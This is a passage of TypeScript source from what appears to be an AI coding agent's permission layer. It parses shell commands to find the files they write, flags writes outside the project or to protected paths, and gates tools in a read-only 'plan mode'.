    // below already applies the same heuristic to correctly tokenised argv,
    // and raw words would add backslash-escaped noise (e.g. `a\ b`).
    if (process.platform === 'win32') {
      for (let index = 0; index < values.length; index += 1) {
        if (roles.sourceIndexes.has(index) || roles.pathIndexes.has(index)) continue;
        const value = values[index]!;
        if (looksLikePath(value)) paths.add(value);
      }
    }
  }

  // Pass 1: AST-based argv + redirection targets (handles quoted-with-spaces)
  for (const stmt of tree.statements) {
    for (const stage of stmt.stages) {
      const roles = collectCommandArgumentRoles(stage.argv);
      if (process.platform !== 'win32') {
        for (const value of roles.pathValues) paths.add(value);
      }
      for (let index = 0; index < stage.argv.length; index += 1) {
        const token = stage.argv[index]!;
        if (roles.sourceIndexes.has(index) || roles.pathIndexes.has(index)) continue;
        if (looksLikePath(token)) paths.add(token);
      }
      for (const redir of stage.redirections) {
        if (redir.descriptorDuplication) continue;
        if (looksLikePath(redir.target)) paths.add(redir.target);
      }
    }
  }

  // Pass 2: legacy regex pass (handles Windows backslash paths shell-quote
  // can't tokenise). Always run — even on parseable input — because the
  // two passes recognise different forms.
  for (const p of legacyRegexPathScan(maskRawInlineSources(command))) {
    paths.add(p);
  }

  return Array.from(paths);
}

/**
 * Check if a bash command operates on any protected paths
 * Issue 052: Prevent "always" option for bash commands on protected paths
 */
export function isCommandOnProtectedPath(
  command: string,
  projectRoot: string,
  executionCwd = projectRoot,
): boolean {
  const readOnly = isBashReadCommand(command);
  const paths = extractPathsFromCommand(command);
  for (const p of paths) {
    const resolved = resolveExecutionPath(p, executionCwd);
    if (readOnly && isProtectedAgentHomeReadTarget(resolved, executionCwd)) {
      return true;
    }
    if (readOnly && isReadableAgentHomeTarget(resolved)) continue;
    if (isAlwaysConfirmPath(resolved, projectRoot)) {
      return true;
    }
  }
  return false;
}

function isReadableAgentHomeTarget(targetPath: string): boolean {
  try {
    const agentHome = canonicalizeAgentHomePolicyPath(getAgentConfigHome())
      ?? path.resolve(getAgentConfigHome());
    const target = canonicalizeAgentHomePolicyPath(targetPath);
    return target !== undefined && isPathInsideDirectory(target, agentHome);
  } catch {
    return false;
  }
}

export function isBashReadCommandAutoAllowed(
  command: string,
  projectRoot: string,
  executionCwd = projectRoot,
): boolean {
  return isBashReadCommand(command)
    && !isCommandOnProtectedPath(command, projectRoot, executionCwd);
}

function normalizePathForComparison(targetPath: string): string {
  const normalized = path.normalize(targetPath);
  return process.platform === 'win32' ? normalized.toLowerCase() : normalized;
}

function pathsEqual(leftPath: string, rightPath: string): boolean {
  return normalizePathForComparison(leftPath) === normalizePathForComparison(rightPath);
}

/**
 * Check whether a path stays inside the project root after resolution.
 */
export function isPathInsideProject(targetPath: string, projectRoot: string): boolean {
  try {
    const resolvedRoot = path.resolve(projectRoot);
    const resolvedTarget = path.resolve(
      resolvedRoot,
      expandSystemTempAlias(expandHomeDirectory(targetPath)),
    );
    return isPathInsideDirectory(resolvedTarget, resolvedRoot);
  } catch {
    return false;
  }
}

function collectAbsolutePathCandidates(command: string): string[] {
  const matches = command.match(/[A-Za-z]:[\\/][^\s;|&<>(){}'"]+|\/[^\s;|&<>(){}'"]+/g);
  if (!matches) {
    return [];
  }

  return matches.filter(match => !/^(?:\/dev\/|\/proc\/)/i.test(match));
}

function resolveExistingPathPrefix(targetPath: string): string {
  const resolved = path.resolve(targetPath);
  const cached = existingPathPrefixCache.get(resolved);
  if (cached) {
    return cached;
  }

  if (fs.existsSync(resolved)) {
    const realPath = fs.realpathSync.native(resolved);
    existingPathPrefixCache.set(resolved, realPath);
    return realPath;
  }

  const segments: string[] = [];
  let current = resolved;

  while (!fs.existsSync(current)) {
    const parent = path.dirname(current);
    if (parent === current) {
      existingPathPrefixCache.set(resolved, resolved);
      return resolved;
    }
    segments.unshift(path.basename(current));
    current = parent;
  }

  const resolvedPrefix = fs.realpathSync.native(current);
  const fullPath = path.join(resolvedPrefix, ...segments);
  existingPathPrefixCache.set(resolved, fullPath);
  return fullPath;
}

function expandHomeDirectory(targetPath: string): string {
  if (targetPath === '~') {
    return os.homedir();
  }
  if (targetPath.startsWith(`~${path.sep}`) || targetPath.startsWith('~/') || targetPath.startsWith('~\\')) {
    return path.join(os.homedir(), targetPath.slice(2));
  }
  return targetPath;
}

function expandSystemTempAlias(targetPath: string): string {
  const tempDir = os.tmpdir();
  const patterns: Array<[RegExp, string]> = [
    [/^%temp%/i, tempDir],
    [/^%tmp%/i, tempDir],
    [/^\$env:temp\b/i, tempDir],
    [/^\$env:tmp\b/i, tempDir],
    [/^\$tmpdir\b/i, tempDir],
    [/^\$temp\b/i, tempDir],
    [/^\$tmp\b/i, tempDir],
  ];

  for (const [pattern, replacement] of patterns) {
    if (pattern.test(targetPath)) {
      return targetPath.replace(pattern, replacement);
    }
  }

  return targetPath;
}

function resolvePermissionPath(
  targetPath: string,
  projectRoot?: string,
  executionCwd = projectRoot,
): string {
  const baseRoot = path.resolve(executionCwd ?? projectRoot ?? process.cwd());
  const expanded = expandSystemTempAlias(expandHomeDirectory(targetPath));
  const resolved = path.isAbsolute(expanded)
    ? path.resolve(expanded)
    : path.resolve(baseRoot, expanded);
  return resolveExistingPathPrefix(resolved);
}

function getSystemTempDirectories(): string[] {
  if (cachedSystemTempDirectories) {
    return cachedSystemTempDirectories;
  }

  const tempDirs = new Set<string>();
  const candidates = [os.tmpdir(), process.env.TEMP, process.env.TMP, process.env.TMPDIR]
    .filter((value): value is string => typeof value === 'string' && value.trim().length > 0);

  for (const candidate of candidates) {
    try {
      tempDirs.add(resolveExistingPathPrefix(candidate));
    } catch {
      // Ignore malformed temp env values and fall back to the OS default temp dir.
    }
  }

  cachedSystemTempDirectories = Array.from(tempDirs);
  return cachedSystemTempDirectories;
}

export function getPlanModeAllowedWritablePaths(projectRoot?: string): {
  projectPlanDoc: string;
  systemTempDirs: string[];
} {
  const resolvedRoot = resolveExistingPathPrefix(projectRoot ?? process.cwd());
  return {
    projectPlanDoc: path.join(resolvedRoot, PLAN_MODE_PROJECT_DOC_RELATIVE_PATH),
    systemTempDirs: getSystemTempDirectories(),
  };
}

export function isPlanModeAllowedPath(
  targetPath: string,
  projectRoot?: string,
  executionCwd = projectRoot,
): boolean {
  const resolvedTarget = resolvePermissionPath(targetPath, projectRoot, executionCwd);
  const { projectPlanDoc, systemTempDirs } = getPlanModeAllowedWritablePaths(projectRoot);

  if (pathsEqual(resolvedTarget, projectPlanDoc)) {
    return true;
  }

  return systemTempDirs.some(tempDir => isPathInsideDirectory(resolvedTarget, tempDir));
}

function formatPlanModeAllowedLocations(projectRoot?: string): string {
  const { projectPlanDoc, systemTempDirs } = getPlanModeAllowedWritablePaths(projectRoot);
  const tempSummary = systemTempDirs[0] ?? os.tmpdir();
  return `${projectPlanDoc} or the system temp directory (${tempSummary})`;
}

/**
 * Subcommand verbs in `tee` that take a file as the next positional arg.
 * Empty for `tee` itself — its only flag we care about is `-a` (append),
 * which doesn't change which token is the target. Listed for symmetry
 * with future expansion.
 */
const TEE_FLAGS_TAKING_NO_VALUE = new Set(['-a', '--append', '-i', '--ignore-interrupts']);

/**
 * From a stage whose `argv[0]` is `tee` (case-insensitive), return the
 * positional target file(s). Skips known boolean flags; takes the first
 * non-flag positional after them. Multiple targets technically supported
 * by tee — we collect all of them.
 */
function collectTeeTargets(stage: { readonly argv: readonly string[] }): string[] {
  const targets: string[] = [];
  for (let i = 1; i < stage.argv.length; i += 1) {
    const tok = stage.argv[i]!;
    if (TEE_FLAGS_TAKING_NO_VALUE.has(tok)) continue;
    if (tok.startsWith('-')) continue; // unknown flag — skip to be safe
    targets.push(tok);
  }
  return targets;
}

function collectPowerShellWriteTargets(stage: { readonly argv: readonly string[] }): string[] {
  const analysis = analyzePowerShellMutation(stage.argv);
  const targets: string[] = [];
  for (const operation of analysis.operations) {
    if ('target' in operation) targets.push(operation.target);
    else if (operation.kind === 'copy') targets.push(operation.destination);
    else targets.push(operation.source, operation.destination);
  }
  return targets;
}

/**
 * Collect the file targets that a bash command might write to. Used by
 * plan-mode (`getPlanModeBlockReason`) and `getBashOutsideProjectWriteRisk`.
 *
 * FEATURE_152 (v0.7.38): backed by `parseBashCommand` AST. The pre-AST
 * version concatenated four overlapping regex sweeps over the raw command
 * string — each had its own substring-vs-token pitfalls (e.g. `tee`
 * matched as substring in `committee.txt`). The AST gives clean argv
 * tokens with quoting stripped, and per-stage redirection targets.
 */
export function collectBashWriteTargets(command: string): string[] {
  return collectBashWriteTargetsAtDepth(command, 0, true);
}

/** Parsed targets whose command role itself proves they are mutated. */
export function collectDeterministicBashWriteTargets(command: string): string[] {
  return collectBashWriteTargetsAtDepth(command, 0, false);
}

const MUTATE_ALL_POSITIONAL_COMMANDS = new Set([
  'rm', 'rmdir', 'mkdir', 'touch', 'mv', 'move', 'ren', 'del', 'erase', 'rd',
]);
const DESTINATION_ONLY_COMMANDS = new Set(['cp', 'copy']);

const CMD_MUTATION_SWITCHES: Readonly<Record<string, ReadonlySet<string>>> = {
  copy: new Set(['/a', '/b', '/d', '/j', '/l', '/n', '/v', '/y', '/-y', '/z']),
  del: new Set(['/p', '/f', '/s', '/q', '/a']),
  erase: new Set(['/p', '/f', '/s', '/q', '/a']),
  move: new Set(['/y', '/-y']),
  rd: new Set(['/s', '/q']),
  rmdir: new Set(['/s', '/q']),
};

function isCmdMutationSwitch(command: string, token: string): boolean {
  const normalized = token.toLowerCase();
  const base = normalized.slice(0, normalized.indexOf(':') >= 0
    ? normalized.indexOf(':')
    : normalized.length);
  return CMD_MUTATION_SWITCHES[command]?.has(base) === true;
}

function collectPositionalArgs(
  command: string,
  argv: readonly string[],
  startIndex = 1,
): string[] {
  const positional: string[] = [];
  let optionsEnded = false;
  for (let index = startIndex; index < argv.length; index += 1) {
    const token = argv[index]!;
    if (!optionsEnded && ['touch', 'chmod', 'chown'].includes(command)) {
      if ((command === 'touch' && token === '-r') || token === '--reference') {
        index += 1;
        continue;
      }
      if (/^--reference=/.test(token) || (command === 'touch' && /^-r.+/.test(token))) continue;
    }
    if (token === '--') {
      optionsEnded = true;
    } else if (optionsEnded || (!token.startsWith('-') && !isCmdMutationSwitch(command, token))) {
      positional.push(token);
    }
  }
  return positional;
}

function collectDirectCommandWriteTargets(stage: { readonly argv: readonly string[] }): string[] {
  const command = commandBasename(stage.argv[0] ?? '');
  const positional = collectPositionalArgs(command, stage.argv);
  if (MUTATE_ALL_POSITIONAL_COMMANDS.has(command)) return positional;
  if (DESTINATION_ONLY_COMMANDS.has(command)) {
    const targetDirectoryIndex = stage.argv.findIndex((token) => (
      token === '-t' || token === '--target-directory'
    ));
    if (targetDirectoryIndex >= 0) {
      const targetDirectory = stage.argv[targetDirectoryIndex + 1];
      return targetDirectory ? [targetDirectory] : [];
    }
    const attachedTarget = stage.argv.find((token) => token.startsWith('--target-directory='));
    return attachedTarget ? [attachedTarget.slice('--target-directory='.length)] : positional.slice(-1);
  }
  if (command === 'chmod' || command === 'chown') {
    const copiesReference = stage.argv.some((token) => (
      token === '--reference' || token.startsWith('--reference=')
    ));
    return copiesReference ? positional : positional.slice(1);
  }
  if (command === 'dd') {
    const output = stage.argv.find((token) => token.startsWith('of='));
    return output ? [output.slice(3)] : [];
  }
  return [];
}

function collectRawOutputRedirectionTargets(command: string): string[] {
  const targets: string[] = [];
  const masked = maskRawInlineSources(command);
  let quote: '"' | "'" | undefined;
  for (let index = 0; index < masked.length; index += 1) {
    const char = masked[index]!;
    if (quote !== undefined) {
      if (char === quote) quote = undefined;
      else if (char === '\\' && quote === '"') index += 1;
      continue;
    }
    if (char === '"' || char === "'") {
      quote = char;
      continue;
    }
    if (char === '\\') {
      index += 1;
      continue;
    }
    if (char !== '>') continue;
    if (masked[index + 1] === '>') index += 1;
    while (/\s/.test(masked[index + 1] ?? '')) index += 1;
    const targetQuote = masked[index + 1];
    const start = index + (targetQuote === '"' || targetQuote === "'" ? 2 : 1);
    let end = start;
    while (end < masked.length) {
      const targetChar = masked[end]!;
      if (targetQuote === '"' || targetQuote === "'") {
        if (targetChar === targetQuote) break;
      } else if (/\s|[|;&<>]/.test(targetChar)) {
        break;
      }
      end += 1;
    }
    if (end > start) targets.push(masked.slice(start, end));
    index = end;
  }
  return targets;
}

function collectBashWriteTargetsAtDepth(
  command: string,
  depth: number,
  includeHeuristicPaths: boolean,
): string[] {
  const targets = new Set<string>();
  const pushTarget = (value: string | undefined): void => {
    const trimmed = value?.trim();
    if (trimmed) targets.add(trimmed);
  };

  // 1. Heuristic path tokens (covers e.g. `cp src.ts dst.ts` where neither
  //    arg is a redirection but both name files). Pre-AST version included
  //    this via `extractPathsFromCommand`; preserved for compat.
  if (includeHeuristicPaths) {
    for (const extractedPath of extractPathsFromCommand(command)) {
      pushTarget(extractedPath);
    }
  } else {
    for (const target of collectRawOutputRedirectionTargets(command)) {
      pushTarget(target);
    }
  }

  const tree = parseBashCommand(command);
  if (tree.unparseable) {
    // A shell payload can contain syntax deliberately rejected by the AST
    // (notably backticks) while still exposing a deterministic redirect.
    // Recover only recognized shell-command roles; arbitrary quoted Python,
    // regex, and data arguments remain opaque.
    if (depth < 3) {
      for (const words of tokenizeRawCommandStages(command)) {
        const nested = getNestedShellCommand(words.map((word) => word.value));
        if (nested === undefined) continue;
        for (const target of collectBashWriteTargetsAtDepth(
          nested,
          depth + 1,
          includeHeuristicPaths,
        )) {
          pushTarget(target);
        }
      }
    }
    return Array.from(targets);
  }

  for (const stmt of tree.statements) {
    for (const stage of stmt.stages) {
      // 2. Redirection targets — output redirects only; input redirects
      //    don't write. Null-device redirects ARE included so plan-mode
      //    won't mistake `echo hi 2>NUL > /tmp/out` for "no targets".
      for (const redir of stage.redirections) {
        if (redir.descriptorDuplication) continue;
        if (redir.input) continue;
        pushTarget(redir.target);
      }

      // 3. Stage-command-specific writes
      const cmd = stage.argv[0]?.toLowerCase();
      if (!cmd) continue;
      if (cmd === 'tee') {
        for (const t of collectTeeTargets(stage)) pushTarget(t);
      } else if (POWERSHELL_WRITE_TOKENS.has(cmd)) {
        for (const t of collectPowerShellWriteTargets(stage)) pushTarget(t);
      }
      if (!includeHeuristicPaths) {
        for (const target of collectDirectCommandWriteTargets(stage)) pushTarget(target);
      }

      const nested = depth < 3 ? getNestedShellCommand(stage.argv) : undefined;
      if (nested !== undefined) {
        for (const target of collectBashWriteTargetsAtDepth(
          nested,
          depth + 1,
          includeHeuristicPaths,
        )) {
          pushTarget(target);
        }
      }
    }
  }

  return Array.from(targets);
}

export function getBashOutsideProjectWriteRisk(
  command: string,
  projectRoot: string
): { dangerous: boolean; reason?: string } {
  if (!isBashWriteCommand(command)) {
    return { dangerous: false };
  }

  const targets = new Set<string>([
    ...collectBashWriteTargets(command),
    ...collectAbsolutePathCandidates(command),
  ]);

  for (const targetPath of targets) {
    if (!isPathInsideProject(targetPath, projectRoot)) {
      return {
        dangerous: true,
        reason: `Command may modify file outside project: ${targetPath}`,
      };
    }
  }

  return { dangerous: false };
}

/**
 * v0.7.42 — Metadata-driven plan-mode gate.
 *
 * Decision order (first match wins):
 *
 *   1. Tool has `planModeAllowed: true` in its `LocalToolDefinition` →
 *      permitted (`null`). Covers planning-loop tools whose effect IS the
 *      planning workflow: `exit_plan_mode`, `task_stop`, `todo_*`,
 *      `ask_user_question`, plus read-class network queries
 *      (`web_search`, `mcp_search` / `mcp_describe` /
 *      `mcp_read_resource` / `mcp_get_prompt`).
 *   2. Tool has `sideEffect === 'readonly'` AND not explicitly disallowed →
 *      permitted (`null`). Read tools never need plan-mode gating.
 *   3. Path-aware FS-write escape: tools in `FILE_MODIFICATION_TOOLS`
 *      (computed from `sideEffect === 'mutates-fs' AND requires path`)
 *      can write IF the target path is `.agent/plan_mode_doc.md` or the
 *      system temp dir.
 *   4. `bash` special case: command-content-aware check via
 *      `isBashWriteCommand` + `collectBashWriteTargets` — read-only bash
 *      (`git status`, `ls`, …) is permitted; write bash with all targets
 *      in the plan-doc / temp escape is permitted; everything else
 *      blocks.
 *   5. Everything else with a side effect → blocked with a generic
 *      reason naming the side-effect class.
 *
 * Pre-v0.7.42 this function only gated `write`, `edit`, `undo`, `bash` —
 * a hardcoded 4-tool list that silently let `multi_edit`,
 * `insert_after_anchor`, `worktree_*`, `scaffold_*`, `stage_*`,
 * `dispatch_child_task`, `send_message`, `web_fetch`, `mcp_call` etc.
 * fall through to `return null` (permitted). The metadata-driven gate
 * closes that gap structurally — new mutating tools auto-block until
 * explicitly opted in via `planModeAllowed: true`.
 */
export function getPlanModeBlockReason(
  toolName: string,
  input: Record<string, unknown>,
  projectRoot?: string,
  executionCwd = projectRoot,
  runScopedTools?: ReadonlyMap<string, RunScopedToolDefinition>,
): string | null {
  const allowedLocations = formatPlanModeAllowedLocations(projectRoot);

  // (1) + (2): metadata says this tool is permitted in plan mode. Covers
  // read-only tools (no `planModeAllowed` flag needed) and explicitly
  // plan-allowed mutating tools. Run-scoped host tools resolve through
  // the optional map first (fail-closed when absent).
  if (isToolPlanModeAllowed(toolName, runScopedTools)) {
    return null;
  }
  // (3) Path-aware FS-write escape. Tools in this set declare a `path`
  // input and mutate the filesystem; permit when the path is the
  // project plan doc or the system temp dir.
  if (FILE_MODIFICATION_TOOLS.has(toolName)) {
    const targetPath = typeof input.path === 'string' ? input.path : '';
    if (!targetPath) {
      return `[Blocked] Tool '${toolName}' is not allowed in plan mode unless it targets ${allowedLocations}.`;
    }

    if (isPlanModeAllowedPath(targetPath, projectRoot, executionCwd)) {
      return null;
    }

    return `[Blocked] Plan mode only allows file modifications in ${allowedLocations}. Requested path: ${targetPath}`;
  }

  // (4) bash: command-content-aware check (read-only commands permitted).
  if (toolName === 'bash') {
    const command = (input.command as string) ?? '';
    if (!isBashWriteCommand(command)) {
      return null;
    }

    const targets = collectBashWriteTargets(command);
    if (targets.length === 0) {
      return `[Blocked] Plan mode only allows bash write operations when every target is either ${allowedLocations}. Could not determine a safe target from: ${command.slice(0, 80)}${command.length > 80 ? '...' : ''}`;
    }

    const blockedTarget = targets.find(target => (
      !isPlanModeAllowedPath(target, projectRoot, executionCwd)
    ));
    if (!blockedTarget) {
      return null;
    }

    return `[Blocked] Plan mode only allows bash write operations in ${allowedLocations}. Blocked target: ${blockedTarget}`;
  }

  // (5) Generic block for any other tool whose sideEffect declares a
  // mutation. Reaches here only for tools that:
  //   - are NOT planModeAllowed: true
  //   - are NOT sideEffect: 'readonly'
  //   - are NOT in FILE_MODIFICATION_TOOLS (path-aware)
  //   - are NOT 'bash' (command-aware)
  // i.e. `undo`, `worktree_*`, `dispatch_child_task`, `send_message`,
  // `web_fetch`, `mcp_call`, constructed-tool staircase, etc.
  return `[Blocked] Tool '${toolName}' has side effects and is not permitted in plan mode. Switch to accept-edits or auto mode to use it, or work within ${allowedLocations}.`;
}

// ============== Mode Inference ==============

/**
 * Infer PermissionMode from legacy options (backward compat)
 */
export function inferPermissionMode(opts: {
  auto?: boolean;
  mode?: 'code' | 'ask';
  confirmTools?: Set<string>;
}): PermissionMode {
  if (opts.mode === 'ask') return 'plan';
  if (opts.auto) return 'auto';
  if (opts.confirmTools && opts.confirmTools.size === 0) return 'auto';
  if (opts.confirmTools && !opts.confirmTools.has('write') && !opts.confirmTools.has('edit')) {
    return 'accept-edits';
  }
  return 'accept-edits';
}
